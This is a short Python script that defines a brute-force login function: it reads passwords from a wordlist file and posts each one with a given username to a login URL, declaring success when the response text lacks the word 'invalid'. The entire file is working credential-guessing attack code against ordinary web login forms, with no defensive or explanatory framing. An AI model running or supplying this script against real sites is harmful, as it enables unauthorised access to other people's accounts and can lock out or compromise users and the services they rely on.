import requests

def brute_force_login(url, username, wordlist):
    print(f"\n🔐 Starting brute-force on: {url} (username: {username})")

    try:
        with open(wordlist, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("❌ Wordlist file not found!")
        return

    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "invalid" not in response.text.lower():
            print(f"✅ Password found: {password}")
            return

    print("❌ Password not found in wordlist.")
